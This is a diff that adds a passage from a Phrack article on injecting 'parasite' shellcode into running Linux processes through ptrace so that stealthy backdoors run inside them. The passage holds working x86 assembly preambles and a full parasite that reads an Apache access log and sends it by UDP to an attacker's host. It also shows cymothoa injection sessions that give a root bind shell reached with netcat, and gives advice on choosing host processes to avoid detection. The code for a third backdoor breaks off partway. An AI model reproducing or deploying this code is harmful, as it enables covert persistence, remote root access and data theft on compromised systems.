@@ -1,0 +1,1472 @@
+                              ==Phrack Inc.==
+
+                Volume 0x0e, Issue 0x44, Phile #0x09 of 0x13
+
+|=-----------------------------------------------------------------------=|
+|=---------------------=[ Single Process Parasite ]=---------------------=|
+|=----------------=[ The quest for the stealth backdoor ]=---------------=|
+|=-----------------------------------------------------------------------=|
+|=--------------------------=[ by Crossbower ]=--------------------------=|
+|=-----------------------------------------------------------------------=|
+
+Index
+
+------[ 0. Introduction
+------[ 1. Brief discussion on injection methods
+------[ 2. First generation: fork() and clone()
+------[ 3. Second generation: signal()/alarm()
+------[ 4. Third generation: setitimer()
+------[ 5. Working parasites
+------------[ 5.1 Process and thread backdoor
+------------[ 5.2 Remote "tail follow" parasite
+------------[ 5.3 Single process backdoor
+------[ 6. Something about the injector
+------[ 7. Further readings
+------[ 8. Links and references
+
+------[ 0. Introduction
+
+In biology a parasite is an organism that grows, feeds, and live in a
+different organism while contributing nothing to the survival of its host.
+
+(There is another interesting definition that, even if it's less relevant,
+I find funny: a professional dinner guest, especially in ancient Greece.
+>From Greek parastos, person who eats at someone else's table,
+parasite : para-,beside; stos, grain, food.)
+
+So, without digressing too much, what do we mean by "parasite" in this
+document? A parasite is simply some executable code that lives within
+another process, but that was injected after its loading time, by a
+third person/program.
+
+Any process can become infected quite easily, using standard libraries
+provided by operating systems (we will use process trace, ptrace [0]).
+
+The real difficulty for the parasite is to coexist peacefully with the host
+process, without killing it. For "death" of the host we also intend a
+situation where, even if the process remains active, it is no longer
+able to work properly, because its memory has been corrupted.
+
+The of goal this document is to create a parasite that live and let live
+the host process, as if nothing had happened.
+
+Starting with simple techniques, and and gradually improving the parasite,
+we'll reach a point where our creature is scheduled inside the process of
+the host, without the need of fork() or similar calls (i.e. clone()).
+
+An interesting question is: why a parasite is an excellent backdoor?
+
+The simplest answer is that a parasite hides what is not permitted in what
+is allowed, so that:
+  - it's difficult to detect using conventional tools
+  - it's more stable and easy to use than kernel-level rootkits.
+
+If the target system has security tools that automatically monitor the
+integrity of executable files, but that do not perform complete audits of
+memory, the parasite will not trigger any alarm.
+
+After this introduction we can dive into the problematic.
+
+If you prefer practical examples, you can "jump" to paragraph 5,
+which shows three different types of real parasite.
+
+------[ 1. Brief discussion on injection methods
+
+To separate the creation of the shellcode from the methods used to inject
+it into the host process, this section will discuss how the parasite is
+injected (in the examples of this document).
+
+Unlike normal shellcode that, depending on the vulnerability exploited,
+can not contain certain types of characters (e.g. NULLs), a parasite has
+no particular restrictions.
+
+It can contain any character, even NULL bytes, because ptrace [0] allows to
+modify directly the .text section of a process.
+
+The first question that arises regards where to place parasitic code.
+This memory location must not be essential to the program, and should not
+be invoked by the code after the start (or shortly after the start) of
+the host process.
+
+We can use run-time patching, but it's complicated technique and makes it
+difficult to ensure the correct functioning of the process after the
+manipulation. It is therefore not suitable for complex parasites.
+
+The author has chosen to inject the code into the memory range of libdl.so
+library, since it is used during the loading stage of programs but then
+usually no longer necessary (more info: [1][2]).
+
+Another reason for this choice is that the memory address of the library,
+when loaded into the process, is exported in the /proc filesystem.
+
+You can easily see that by typing:
+$ cat /proc/self/maps
+...
+b7778000-b777a000 rw-p 00139000 fe:00 37071197   /lib/libc-2.7.so
+b777a000-b777d000 rw-p b777a000 00:00 0
+...
+b7782000-b779c000 r-xp 00000000 fe:00 37071145   /lib/ld-2.7.so  <---
+...
+
+Libdl is mapped at the range b7782000-b779c000 and is executable. The
+injected starting at the initial address of the range is perfectly
+executable.
+
+Some considerations about this method: if the infected program uses
+dlopen(), dlclose() or dlsym() during its execution, some problems
+could arise. The solution is to inject into the same library, but in
+unused memory locations.
+(From the tests of the author the initial memory locations of the library
+are not critical and do not affect the execution of programs.)
+
+There are other problems on linux systems that use the grsec kernel patch.
+Using this patch the text segment of the host process  is marked
+read/execute only and therefore will not be writable with ptrace.
+If that's your case, Ryan O'Neill has published a very powerful
+algorithm [3] that exploits sysenter instructions (used by the host's code)
+to execute a serie of system calls (the algorithm is able to
+allocate and set the correct permission on a new memory area without
+modifying the text segment of the traced process).
+I recommend everyone read the document, as it is very interesting.
+
+The other premise, I want to do in this section, regards the basic
+informations the injector (the program that injects the parasite) must
+provide to the shellcode to restore the execution of the host program.
+
+Our implementation of the injector gets the current EIP (Instruction
+Pointer) of the host process, push it on the stack and writes in the EIP
+the address of the parasite (injected into libdl).
+
+The parasite, in its initialization part, saves every register it uses.
+Then, at the end of its execution, every modified register is restored.
+A simple way to do this is to push and pop the registers with the
+instructions PUSHA and POPA.
+
+After that, a simple RET instruction restores the execution of the host
+process, since the its saved EIP is on the top of the stack.
+
+%<%<%<%<%<%<%<%<%<%<%<%<%<%<%<%<%<%<%<%<%<%<%<%<%<%<%<%<%<%<%<%<%<%<%<%<%<%
+
+parasite_skeleton:
+
+    # preamble
+    push %eax       # save registers
+    push %ebx       # used by the shellcode
+
+    # ...
+    # shellcode
+    # ...
+
+    # epilogue
+    pop %ebx        # restore modified registers
+    pop %eax        # ...
+
+    ret             # restore execution of the host
+
+%<%<%<%<%<%<%<%<%<%<%<%<%<%<%<%<%<%<%<%<%<%<%<%<%<%<%<%<%<%<%<%<%<%<%<%<%<%
+
+Another very useful information the injector provides to the shellcode,
+is the address of a persistent memory location. In the case of this
+document, the address is also taken from /proc/pid/maps:
+
+...
+b7701000-b771c000 r-xp 00000000 08:03 1261592    /lib/ld-2.11.1.so
+b771c000-b771d000 r--p 0001a000 08:03 1261592    /lib/ld-2.11.1.so
+b771d000-b771e000 rw-p 0001b000 08:03 1261592    /lib/ld-2.11.1.so <--
+...
+
+The range b771d000-b771e000 has read and write permission and it's
+suitable for this purpose.
+
+Other techniques exists to dynamically create writable and executable
+memory locations, such as the use of mmap() in the host process. But these
+techniques are beyond the scope of this article and will not be analyzed
+here.
+
+Since the necessary premises have been made, we can discuss the first
+generation of our stealth parasite.
+
+------[ 2. First generation: fork() and clone()
+
+The simplest idea to allow the host process to continue its execution
+properly and, at the same time, hide the parasite, is the use of the
+fork() syscall (or the creation of a new thread, not analyzed here).
+
+Using fork() the process is splitted in two:
+ - the parent process (the original one) can continue its normal execution
+ - the child process, instead, will execute the parasite
+
+An important thing to note, is that the child process inherits the parent's
+name and a copy of its memory.
+
+This means that if we inject the parasite in the process "server1",
+another process "server1" will be created as its child.
+
+Before the injection:
+# ps -A
+...
+...
+ 5478 ?        00:00:00 server1
+...
+
+After the injection:
+# ps -A
+...
+...
+ 5478 ?        00:00:00 server1
+ 5479 ?        00:00:00 server1
+...
+
+If the host process is carefully chosen, the parasite will be very hard
+to detect. Just think of some network services (such as apache2) that
+generate a lot of children: a single child process is unlikely to be
+detected.
+
+The fork parasite can be implemented as a preamble preceding the real
+shellcode:
+
+%<%<%<%<%<%<%<%<%<%<%<%<%<%<%<%<%<%<%<%<%<%<%<%<%<%<%<%<%<%<%<%<%<%<%<%<%<%
+
+fork_parasite:
+    push %eax       # save %eax value (needed by parent process)
+
+    push $2
+    pop %eax
+    int $0x80       # fork
+
+    test %eax, %eax
+    jz shellcode    # child:  jumps to shellcode
+
+    pop %eax        # parent: restores host process execution
+    ret
+
+shellcode:          # append your shellcode here
+    # ...
+    # ...
+
+%<%<%<%<%<%<%<%<%<%<%<%<%<%<%<%<%<%<%<%<%<%<%<%<%<%<%<%<%<%<%<%<%<%<%<%<%<%
+
+The preamble simply makes a call to fork(), analyzes the results, and
+decides the execution path to choose.
+
+With this implementation, any existing shellcode can be turned into a
+parasite: it's responsibility of the injector to concatenate the parts
+before inserting them in the host.
+
+A very similar technique uses clone() instead of fork(). We can consider
+clone() a generalization of the fork() syscall through which it's possible
+to create both processes and threads.
+
+The difference is in the options passed to the syscall. A thread is
+generated using particular flags:
+
+  - CLONE_VM  the calling process and the child process run in the same
+              memory space. Memory writes performed by the calling process
+              or by the child process are also visible in the other
+              process.
+              Any memory mapping or unmapping performed by the child or
+              the calling process also affects the other process.
+
+  - CLONE_SIGHAND  the calling process and the child process share the same
+                   table of signal handlers.
+
+  - CLONE_THREAD  the child is placed in the same thread group as the
+                  calling process.
+
+The CLONE_THREAD flag is the most important: it is what distinguishes what
+we call the "process" from what we call "thread" at least on linux systems.
+
+Let's see how the clone() preamble is implemented:
+
+%<%<%<%<%<%<%<%<%<%<%<%<%<%<%<%<%<%<%<%<%<%<%<%<%<%<%<%<%<%<%<%<%<%<%<%<%<%
+
+clone_parasite:
+    pusha           # save registers (needed by parent process)
+
+    # call to sys_clone
+
+    xorl    %eax, %eax
+    mov     $120, %al
+
+    movl     $0x18900, %ebx # flags: CLONE_VM|CLONE_SIGHAND|
+                            #        CLONE_THREAD|CLONE_PARENT
+
+    int     $0x80           # clone
+
+    test %eax, %eax
+    jz shellcode    # child:  jumps to shellcode
+
+    popa            # parent: restores host process execution
+    ret
+
+shellcode:          # append your shellcode here
+    # ...
+    # ...
+
+%<%<%<%<%<%<%<%<%<%<%<%<%<%<%<%<%<%<%<%<%<%<%<%<%<%<%<%<%<%<%<%<%<%<%<%<%<%
+
+The code is based on the fork() preamble, and its behaviour is very
+similar. The difference is in the result.
+
+Before the injection (single threaded process):
+# ps -Am
+...
+...
+ 8360 pts/3    00:00:00 server1
+    - -        00:00:00 -
+...
+
+After the injection (an additional thread is created):
+# ps -A
+...
+...
+ 8360 pts/3    00:00:00 server1
+    - -        00:00:00 -
+    - -        00:00:00 -
+...
+
+Surely the generation of a thread is more stealthy than the generation of a
+process. However there is a small disadvantage, if the parasite thread
+alters parts of the main thread can bring the host to a crash:
+the use of the resources, that are shared, must be much more careful.
+
+We have just seen how to create parasites executed as independent processes
+or threads.
+
+However, these types of parasites are not completely invisible. In some
+circumstances, and in the case of particular (monitored) processes, the
+generation of a child (process or thread) can be problematic or easily
+detectable.
+
+Therefore, in the next section, we will discuss in a different type of
+parasite/preamble, deeply integrated with its host.
+
+------[ 3. Second generation: signal()/alarm()
+
+If we don't like the creation of another process to execute our parasite
+we need some kind of time sharing mechanism inside a single process (did
+you see the title of this document?)
+
+It's a scheduling problem: when a new process is created, the operating
+system takes care of assigning it time and resources necessary to its
+execution.
+If we don't want to rely on this mechanism, we have to simulate a scheduler
+within a single process, to allow a concurrent execution of parasite and
+host, using (usually) asynchronous events.
+
+When you think of asynchronous events in a Unix-like system, the first
+thing that comes to mind are signals.
+If a process registers a handler for a specific signal, when the signal
+is sent the operating system stops its normal execution and makes a
+(void function) call to the handler.
+When the handler returns, the execution of the process is restored.
+
+There are several functions provided by the operating system to generate
+signals. In this chapter we'll use alarm().
+
+Alarm() arranges for a SIGALRM signal to be delivered to the calling
+process when an arbitrary number of seconds has passed.
+Its main limitation is that you can not specify time intervals shorter than
+one second, but this is not a problem in most cases.
+
+Our parasite/preamble needs to register itself as a handler for the signal
+SIGALRM, and renew the timer every time it is executed, to be called at
+regular intervals.
+This creates a kind of scheduler within a single process, and there is no
+the need to call fork() (or functions to create threads).
+
+Here is our second generation parasite/preamble:
+
+%<%<%<%<%<%<%<%<%<%<%<%<%<%<%<%<%<%<%<%<%<%<%<%<%<%<%<%<%<%<%<%<%<%<%<%<%<%
+
+# signal/alarm parasite
+
+handler:
+    pusha
+    # alarm(timeout)
+    xorl    %eax, %eax
+    xorl    %ebx, %ebx
+    mov     $27, %al
+    mov     $0x1, %bl    # 1 second
+    int     $0x80
+
+schedule:
+    # signal(SIGALRM, handler)
+    xorl    %eax, %eax
+    xorl    %ebx, %ebx
+    mov    $48, %al
+    mov    $14, %bl
+    jmp    schedule_end   # load schedule_end address
+load_handler:
+    pop    %ecx
+    subl    $0x23, %ecx   # adjust %ecx to point handler()
+    int    $0x80
+    popa
+    jmp    shellcode
+
+schedule_end:
+    call load_handler
+
+shellcode:        # append your shellcode here
+    # ...
+    # ...
+
+%<%<%<%<%<%<%<%<%<%<%<%<%<%<%<%<%<%<%<%<%<%<%<%<%<%<%<%<%<%<%<%<%<%<%<%<%<%
+
+Of course the type of shellcode you can append to the preamble must
+be aware of the "alternative" scheduling mechanism.
+
+It must be able to split its operations between multiple calls, and must
+also not take too much time to run a single step (i.e. a single call),
+to not slow down the host program or overlap with the next handler call.
+
+In short, a call to the handler (our parasite), to work properly must last
+less than the timer interval.
+
+However, alert() is not the only function able to simulate a scheduler.
+In the next chapter we will see a more advanced function, which allows a
+more granular control of the execution of the parasite.
+
+------[ 4. Third generation: setitimer()
+
+We've just arrived at the latest generation of the parasite.
+In the first part of the chapter we'll spend some time to analyze the
+function setitimer(), on which the code is based.
+
+The definition of the function is:
+int setitimer(int which, const struct itimerval *new_value,
+                     struct itimerval *old_value);
+
+As in the case of alarm(), the function setitimer() provides a mechanism
+for a process to interrupt itself in the future using signals.
+Unlike alarm, however, you can specify intervals of a few microseconds and
+choose various types of timers and time domains.
+
+The argument "int which" allows to choose the type of timer and therefore
+the signal that will be sent to the process:
+
+ITIMER_REAL    0x00  the most used timer, it decrements in real time, and
+                     delivers SIGALRM upon expiration.
+
+ITIMER_VIRTUAL 0x01  decrements only when the process is executing, and
+                     delivers SIGVTALRM upon expiration.
+
+ITIMER_PROF    0x02  decrements both when the process executes and when the
+                     system is executing on behalf of the process. Coupled
+                     with  ITIMER_VIRTUAL, this timer is usually used to
+                     profile the time spent by the application in user and
+                     kernel space.  SIGPROF is delivered upon expiration.
+
+We will use ITIMER_REAL because it allows the generation of signal at
+regular intervals, and is not influenced by environmental factors such as
+the workload of a system.
+
+The argument "const struct itimerval *new_value" points to an itimerval
+structure, defined as:
+
+struct itimerval {
+    struct timeval it_interval; /* next value */
+    struct timeval it_value;    /* current value */
+};
+
+struct timeval {
+    long tv_sec;                /* seconds */
+    long tv_usec;               /* microseconds */
+};
+
+The last timeval structure, it_value, is the period between the calling of
+the function and the first timer interrupt. If zero, the alarm is disabled.
+
+The second one, it_interval, is the period between successive timer
+interrupts. If zero, the alarm will only be sent once.
+
+We'll set both structures at the same time interval.
+
+The last argument, "struct itimerval *old_value", if not NULL, will be set
+by the function at the value of the previous timer. We'll not use this
+feature.
+
+%<%<%<%<%<%<%<%<%<%<%<%<%<%<%<%<%<%<%<%<%<%<%<%<%<%<%<%<%<%<%<%<%<%<%<%<%<%
+
+# setitimer parasite
+
+setitimer_hdr:
+    pusha
+    # sys_setitimer(ITIMER_REAL, *struct_itimerval, NULL)
+    xorl    %eax, %eax
+    xorl    %ebx, %ebx
+    xorl    %edx, %edx
+    mov     $104, %al
+    jmp     struct_itimerval # load itimervar structure
+load_struct:
+    pop     %ecx
+    int     $0x80
+    popa
+    jmp     handler
+
+struct_itimerval:
+    call    load_struct
+    # itimerval structure: you can modify the values
+    # to set your time intervals
+    .long    0x0       # seconds
+    .long    0x5000    # microseconds
+    .long    0x0       # seconds
+    .long    0x5000    # microseconds
+
+# signal handler, called by the timer
+handler:
+    pusha
+    # signal(SIGALRM, handler)
+    xorl    %eax, %eax
+    xorl    %ebx, %ebx
+    mov    $48, %al
+    mov    $14, %bl
+    jmp    handler_end   # load handler_end address
+load_handler:
+    pop    %ecx
+    subl    $0x19, %ecx  # adjust %ecx to point handler()
+    int    $0x80
+    popa
+    jmp    shellcode
+
+handler_end:
+    call load_handler
+
+shellcode:        # append your shellcode here
+    # ...
+    # ...
+
+%<%<%<%<%<%<%<%<%<%<%<%<%<%<%<%<%<%<%<%<%<%<%<%<%<%<%<%<%<%<%<%<%<%<%<%<%<%
+
+The usage of this preamble is similar to the previous (alarm) one, there
+is only the necessity of a fine-tuned timer: a compromise between the
+frequency of executions and the stability of the parasite, which must be
+able to carry out its operations in less time than a timer's cycle.
+
+You can work around this problem by transforming these preambles
+(including the preamble that makes use of alarm()) in epilogues, so that
+the timer starts counting only after the parasite has finished its
+operations.
+
+In fact we are going to see how this was implemented in the real parasites
+presented below.
+
+------[ 5. Working parasites
+
+Here we come to the practical part. Three working parasites will be
+presented: one for each technique exposed in the theoretical part of the
+document.
+
+To inject the parasites the injector cymothoa [4] was used, written by the
+same author, and which already includes the codes presented in the article.
+Although it is possible, through various techniques, to inject shellcodes
+in processes, the download of the program is recommended to try the
+examples during the lecture.
+
+------------[ 5.1 Process and thread backdoor
+
+Our first real parasite is a backdoor created by applying, to pre-existing
+shellcode, the fork() preamble.
+The shellcode used was developed by izik (izik@tty64.org) and is
+available on several sites [5]. For this reason will not be reported.
+
+The shellcode is a classic exploit shellcode: it binds /bin/sh to a TCP
+port and fork a shell for every connection.
+
+Using it aided by an injector, has several advantages:
+  - The ability to configure its behavior. In this case the possibility to
+    choose the port to listen on.
+  - The possibility of keeping the host alive using a one of the
+    preamble shown earlier.
+  - Not having to worry about memory locations necessary to the execution
+    and data storage, since they are automatically provided.
+
+Let's see in practice how this parasite works...
+
+First, on the victim machine, we must identify a suitable host process.
+In this example we will use an instance of cat, since it's really easy to
+check if it continues its execution after the injection.
+
+root@victim# ps -A | grep cat
+ 1727 pts/6    00:00:00 cat
+
+We need this pid for the injection:
+
+root@victim# cymothoa -p 1727 -s 1 -y 5555
+[+] attaching to process 1727
+
+ register info:
+ -----------------------------------------------------------
+ eax value: 0xfffffe00   ebx value: 0x0
+ esp value: 0xbf81e1c8   eip value: 0xb78be430
+ ------------------------------------------------------------
+
+[+] new esp: 0xbf81e1c4
+[+] payload preamble: fork
+[+] injecting code into 0xb78bf000
+[+] copy general purpose registers
+[+] detaching from 1727
+
+[+] infected!!!
+root@victim#
+
+The process is now infected: we should be able to see two cat instances,
+the original one and the new one that corresponds to the parasite:
+
+root@victim# ps -A | grep cat
+ 1727 pts/6    00:00:00 cat
+ 1842 pts/6    00:00:00 cat
+
+If, from a different machine, we try to connect to the port 5555, we should
+get a shell:
+
+root@attacker# nc -vv victim 5555
+Connection to victim 5555 port [tcp/*] succeeded!
+uname -a
+Linux victim 2.6.38 #1 SMP Thu Mar 17 20:52:18 EDT 2011 i686 GNU/Linux
+whoami
+root
+
+At the same time, if we write a few lines in the console where the original
+cat is running, we should see the usual output:
+
+root@victim# cat
+test123
+test123
+foo
+foo
+
+The backdoor function properly: the two processes are running at the same
+time without crashing...
+
+The same backdoor can also be injected in a similar way using the clone()
+preamble, and thus running the parasite as a new thread instead of a new
+process.
+
+The command is similar, we only disable the fork() preamble and force
+clone() instead:
+
+root@victim# cymothoa -p 9425 -s 1 -y 5555 -F -b
+[+] attaching to process 9425
+
+ register info:
+ -----------------------------------------------------------
+ eax value: 0xfffffe00   ebx value: 0x0
+ esp value: 0xbfb4beb8   eip value: 0xb78da430
+ ------------------------------------------------------------
+
+[+] new esp: 0xbfb4beb4
+[+] payload preamble: thread
+[+] injecting code into 0xb78db000
+[+] copy general purpose registers
+[+] detaching from 9425
+
+[+] infected!!!
+
+If we execute ps without special flags we now see only one process:
+
+root@victim# ps -A | grep cat
+ 9425 pts/3    00:00:00 cat
+
+But with the option -m we see an additional thread:
+
+root@victim# ps -Am
+...
+ 9425 pts/3    00:00:00 cat
+    - -        00:00:00 -
+    - -        00:00:00 -
+...
+...
+
+Using netcat on the port 5555 of the victim machine works as expected.
+
+Some notes on the proper use of the fork() and clone() preambles:
+  - This preamble is compatible with virtually any existing shellcode,
+    without any modification. It can be used to easily transform into
+    parasitic code what you have already written.
+    In the case of clone() preamble the situation is slightly more critical
+    because there is the possibility that the parasite thread interferes
+    with the host thread. However, widespread shellcodes are usually
+    already attentive to these issues, and should not cause problems.
+  - It is better to inject the parasite into servers that generate many
+    child processes. Some of those tested by me are apache2, dhclient3 and,
+    in the case of a desktop system, the processes of the window manager.
+    It's hard to find a needle in a haystack, and it is difficult to tell
+    a single parasite from dozens of apache2 processes ;)
+
+------------[ 5.2 Remote "tail follow" parasite
+
+Have you ever used tail with the "-f" (follow)  option? This mode is used
+to monitor text files, usually logs, to see in real time the new lines
+added by other processes.
+
+Tail accepts as option a sleep interval, a waiting time between a
+control of the file and another.
+
+It's therefore natural, when writing a parasite with the same function, to
+use a preamble that allows a precise control of time: the setitimer()
+preamble.
+
+This is the code of this new parasite... It is more complex than the
+previous codes.
+After the source there will be a brief explanation of its operations, and
+finally an example of its practical use.
+
+%<%<%<%<%<%<%<%<%<%<%<%<%<%<%<%<%<%<%<%<%<%<%<%<%<%<%<%<%<%<%<%<%<%<%<%<%<
+
+#
+# Scheduled tail setitimer parasite
+#
+
+#
+# Preamble
+#
+
+setitimer_hdr:
+	pusha
+	# sys_setitimer(ITIMER_REAL, *struct_itimerval, NULL)
+	xorl    %eax, %eax
+	xorl    %ebx, %ebx
+	xorl    %edx, %edx
+	mov     $104, %al
+	jmp     struct_itimerval
+load_struct:
+	pop	%ecx
+	int	$0x80
+	popa
+	jmp	handler
+
+struct_itimerval:
+	call	load_struct
+	# these values are replaced by the injector:
+	.long   0x0#53434553  # seconds
+	.long   0x5343494d  # microseconds
+	.long   0x0#53434553  # seconds
+	.long   0x5343494d  # microseconds
+
+handler:
+	pusha
+	# signal(SIGALRM, handler)
+	xorl	%eax, %eax
+	xorl	%ebx, %ebx
+	mov	$48, %al
+	mov	$14, %bl
+	jmp	handler_end
+load_handler:
+	pop	%ecx
+	subl	$0x19, %ecx # adjust %ecx to point handler()
+	int	$0x80
+	popa
+	jmp	shellcode
+
+handler_end:
+	call load_handler
+#
+# The shellcode starts here
+#
+
+shellcode:
+	pusha
+
+	# check if already initialized
+	mov     $0x4d454d50, %esi  # replaced by the injector
+                                   # (persistent memory address)
+	mov     (%esi), %eax
+	cmp     $0xdeadbeef, %eax
+	je      open_call          # jump if already initialized
+
+	# initialize
+	mov     $0xdeadbeef, %eax
+	mov     %eax, (%esi)
+	add     $4, %esi
+	xorl    %eax, %eax
+	mov     %eax, (%esi)
+	sub     $4, %esi
+
+open_call:
+	# call to sys_open(file_path, O_RDONLY)
+	xorl    %eax, %eax
+	mov     $5, %al
+	jmp     file_path
+load_file_path:
+	pop     %ebx
+	xorl    %ecx, %ecx
+	int     $0x80       # %eax = file descriptor
+	mov     %eax, %edi  # save file descriptor
+
+check_file_length:
+	# call to sys_lseek(fd, 0, SEEK_END)
+	mov     %edi, %ebx
+	xorl    %eax, %eax
+	mov     $19, %al
+	xorl    %ecx, %ecx
+	xorl    %edx, %edx
+	mov     $2, %dl
+	int     $0x80  # %eax = end of file offset (eof)
+
+	# get old eof, and store new eof
+	add     $4, %esi
+	mov     (%esi), %ebx
+	mov     %eax, (%esi)
+
+	# skip the first read
+	test    %ebx, %ebx
+	jz      return_to_main_proc
+
+	# check if file is larger
+	# (current end of file > previous end of file)
+	cmp     %eax, %ebx
+	je      return_to_main_proc # eof not changed:
+                                    # return to main process
+
+calc_data_len:
+	# calculate new data length
+	# (current eof - last eof)
+	mov     %eax, %esi
+	sub     %ebx, %esi # saved in %esi
+
+set_new_position:
+	# call to sys_lseek(fd, last_eof, SEEK_SET)
+	xorl    %eax, %eax
+	mov     $19, %al
+	mov     %ebx, %ecx
+	mov     %edi, %ebx
+	xorl    %edx, %edx
+	int     $0x80  # %eax = last end of file offset
+
+read_file_tail:
+	# allocate buffer
+	sub     %esi, %esp
+
+	# call to sys_read(fd, buf, count)
+	xorl    %eax, %eax
+	mov     $3, %al
+	mov     %edi, %ebx
+	mov     %esp, %ecx
+	mov     %esi, %edx
+	int     $0x80       # %eax = bytes read
+	mov     %esp, %ebp  # save pointer to buffer
+
+open_socket:
+	# call to sys_socketcall($0x01 (socket), *args)
+	xorl    %eax, %eax
+	mov     $102, %al
+	xorl    %ebx, %ebx
+	mov     $0x01, %bl
+	jmp     socket_args
+load_socket_args:
+	pop     %ecx
+	int     $0x80  # %eax = socket descriptor
+	jmp     send_data
+
+socket_args:
+	call load_socket_args
+	.long	0x02	# AF_INET
+	.long	0x02	# SOCK_DGRAM
+	.long	0x00	# NULL
+
+send_data:
+
+	# prepare sys_socketcall (sendto) arguments
+	jmp     struct_sockaddr
+load_sockaddr:
+	pop     %ecx
+	push    $0x10   # sizeof(struct_sockaddr)
+	push    %ecx    # struct_sockaddr address
+	xorl    %ecx, %ecx
+	push    %ecx    # flags
+	push    %edx    # buffer len
+	push    %ebp    # buffer pointer
+	push    %eax    # socket descriptor
+
+	# call to sys_sendto($11 (sendto), *args)
+	xorl    %eax, %eax
+	mov     $102, %al
+	xorl    %ebx, %ebx
+	mov     $11, %bl
+	mov     %esp, %ecx
+	int     $0x80
+	jmp     restore_stack
+
+struct_sockaddr:
+	call load_sockaddr
+	.short	0x02        # AF_INET
+	.short	0x5250      # PORT (replaced by the injector)
+	.long	0x34565049  # DEST IP (replaced by the injector)
+
+restore_stack:
+	# restore stack
+	pop     %ebx    # socket descriptor
+	pop     %eax    # buffer pointer
+	pop     %edx    # buffer len
+	pop     %eax    # flags
+	pop     %eax    # struct_sockaddr address
+	pop     %eax    # sizeof(struct_sockaddr)
+
+	# deallocate buffer
+	add     %edx, %esp
+
+
+close_socket:
+	# call to sys_close(socket)
+	xorl    %eax, %eax
+	mov     $6, %al
+	int     $0x80
+
+return_to_main_proc:
+
+	# call to sys_close(fd)
+	xorl    %eax, %eax
+	mov     $6, %al
+	mov     %edi, %ebx
+	int     $0x80
+
+	# return
+	popa
+	ret
+
+file_path:
+	call load_file_path
+	.ascii  "/var/log/apache2/access.log"
+
+%<%<%<%<%<%<%<%<%<%<%<%<%<%<%<%<%<%<%<%<%<%<%<%<%<%<%<%<%<%<%<%<%<%<%<%<%<%
+
+The code is not written in a super-compact way, since the space it's not
+a problem and the ease of programming and modification has been preferred.
+
+The code can be summarized in a few steps:
+1) Preable (we already know).
+2) Check to see if it's the first execution. This step makes use of a
+   persistent memory location, provided by the injector.
+3) File open and check of length.
+4) Comparison with previous file's length.
+4.1) If unchanged the parasite returns the execution to the host process.
+4.2) If changed the execution continues.
+5) Read the new lines of the file.
+6) Send the new lines to the attacker via UDP
+7) Restore the stack
+8) Return the execution to the host process.
+
+The shellcode receives several parameters from the injector: the address
+of a persistent memory location, the attacker IP address and port, and the
+microsecond interval for the timer.
+
+The injector simply replaces known hexadecimal mark with these parameters
+during the injection. You can see where the replacements occur looking
+at the comments of the code.
+
+Now on to the fun part: the practical use of the parasite.
+
+The first thing to do is to prepare the server on the attacker's machine
+to receive data. Inside the main directory of the injector is present a
+simple implementation of UDP server.
+
+You need only to specify an available port:
+
+root@attacker# ./udp_server 5555
+./udp_server: listening on port UDP 5555
+
+Now we can move to the victim's machine, and choose suitable process.
+For simplicity we will use cat again.
+
+To inject the parasite we must specify some parameters:
+
+root@victim# ./cymothoa -p `pidof cat` -s 14 -k 5000 -x attacker_ip -y 5555
+[+] attaching to process 4694
+
+ register info:
+ -----------------------------------------------------------
+ eax value: 0xfffffe00   ebx value: 0x0
+ esp value: 0xbfa9f3f8   eip value: 0xb77e8430
+ ------------------------------------------------------------
+
+[+] new esp: 0xbfa9f3f4
+[+] injecting code into 0xb77e9000
+[+] copy general purpose registers
+[+] persistent memory at 0xb7805000 (if used)
+[+] detaching from 4694
+
+[+] infected!!!
+
+The process is now infected. No new process has been created.
+
+Now, assuming an apache2 server is running, we can try to make some
+requests to the server to update /var/log/apache2/access.log (the file
+we are monitoring).
+
+root@attacker# curl victim_ip
+<html><body><h1>It works!</h1>
+<p>This is the default web page for this server.</p>
+<p>The web server software is running but no content has been added.</p>
+</body></html>
+
+If everything worked properly we should see, in the console of the UDP
+server UDP, the new lines generated by our requests:
+
+root@attacker# ./udp_server 5555
+./udp_server: listening on port UDP 5555
+::1 - - [26/May/2011:11:18:57 +0200] "GET / HTTP/1.1" 200 460 "-"
+"curl/7.19.7 (i486-pc-linux-gnu) libcurl/7.19.7 OpenSSL/0.9.8k
+zlib/1.2.3.3 libidn/1.15"
+::1 - - [26/May/2011:11:19:26 +0200] "GET / HTTP/1.1" 200 460 "-"
+"curl/7.19.7 (i486-pc-linux-gnu) libcurl/7.19.7 OpenSSL/0.9.8k
+zlib/1.2.3.3 libidn/1.15"
+...
+
+Et voila, we have a remote file sniffer!
+
+Of course the connections do not appear in the output of tools like
+netstat, as they are only brief exchanges of data, and sockets are open
+only when the monitored file has new lines (and immediately closed).
+
+Some notes on the proper use of this preamble and parasite:
+  - This preamble is usually not compatible with virtually existing
+    shellcode. The code must be modified to return the execution to the
+    host process, restoring stack and registers.
+  - It is better to inject the parasite into servers that run all the time
+    the machine is on, but do not use processor very much. The server
+    dhclient3 is a perfect host.
+
+------------[ 5.3 Single process backdoor
+
+We have just arrived at the last and perhaps most interesting example of
+parasite of this document.
+That's what the author wanted to obtain: a backdoor that can live within
+another process, without calls to fork() and without creating new threads.
+
+The backdoor listens on a port (customizable by the injector), and
+periodically checks if a client is connected. This part has been
+implemented using nonblocking sockets and a modified alarm() preamble.
+
+When a client is connected, it obtains a shell: the only time a call
+to fork() is made.
+
+As long as the backdoor is in listening mode, the only way to notice its
+presence is to check the listening ports on the machine, but even in this
+case we can use some tricks to make our parasite very difficult to detect.
+
+Here's the code.
+
+%<%<%<%<%<%<%<%<%<%<%<%<%<%<%<%<%<%<%<%<%<%<%<%<%<%<%<%<%<%<%<%<%<%<%<%<%<%
+
+#
+# Single process backdoor (alarm preamble)
+#
+
+handler:
+	pusha
+
+set_signal_handler:
+	# signal(SIGALRM, handler)
+	xorl	%eax, %eax
+	xorl	%ebx, %ebx
+	mov	$48, %al
+	mov	$14, %bl
+	jmp	set_signal_handler_end
+load_handler:
+	pop	%ecx
+	subl	$0x18, %ecx # adjust %ecx to point handler()
+	int	$0x80
+	jmp	shellcode
+
+set_signal_handler_end:
+	call load_handler
+
+shellcode:
+	# check if already initialized
+	mov     $0x4d454d50, %esi  # replaced by the injector
+                                   # (persistent memory address)
+	mov     (%esi), %eax
+	cmp     $0xdeadbeef, %eax
+	je      accept_call        # jump if already initialized
+
+socket_call:
+	# call to sys_socketcall($0x01 (socket), *args)
+	xorl    %eax, %eax
+	mov     $102, %al
+	xorl    %ebx, %ebx
+	mov     $0x01, %bl
